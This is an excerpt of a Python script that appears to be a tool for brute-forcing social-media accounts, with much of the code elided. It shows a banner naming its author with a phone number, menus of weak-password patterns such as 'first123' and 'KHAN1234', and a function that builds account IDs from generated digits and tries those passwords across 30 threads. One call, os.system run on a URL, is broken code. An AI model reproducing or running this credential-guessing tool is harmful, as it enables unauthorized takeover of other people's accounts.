...
\033[1;37m[+]==============================================
\033[1;37m[*]  \033[1;33mTOOL MAKER   :  AHSAN ALI 
\033[1;37m[*]  \033[1;33mFACEBOOK     :  AHSAN ALI 
\033[1;37m[*]  \033[1;33mGITHUB       :  Ahsanjungli244
\033[1;37m[*]  \033[1;33mWHATSAP      :  03090837124
\033[1;37m[*]  \033[1;33mTOOL VERSION :  1.0
\033[1;37m[*]  \033[1;33mTOOL :  FREE
\033[1;37m[+]==============================================""")
...
def main():
    ...
    if mirwais in ["1","01"]:
        ...
        os.system("https://youtube.com/@JUNGLI.244.gaming.")
        main()  
    elif mirwais in ["0","00"]:
       print('\033[1;92m \033[1;91m FUCK YOU HATERS 🗿')
       exit()
    else:
...
def passx():
    ...
    print(logo)
    print('\033[1;37m[+]==============================================') 
    print("\033[1;97m[01] \033[1;33mPASS 7 DIGITS   + firstlast PASS ")
    print("\033[1;97m[02] \033[1;33mPASS 7 DIGITS  + KHAN1234 PASS ")
    print("\033[1;97m[03] \033[1;33mPASS 7 DIGITS  + first123 PASS ")
    print("\033[1;97m[04] \033[1;33mPASS 7 DIGITS  + first1122 PASS ")
    print('\033[1;37m[+]==============================================') 
...
def awm21():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'firstlast','first123','first1122']
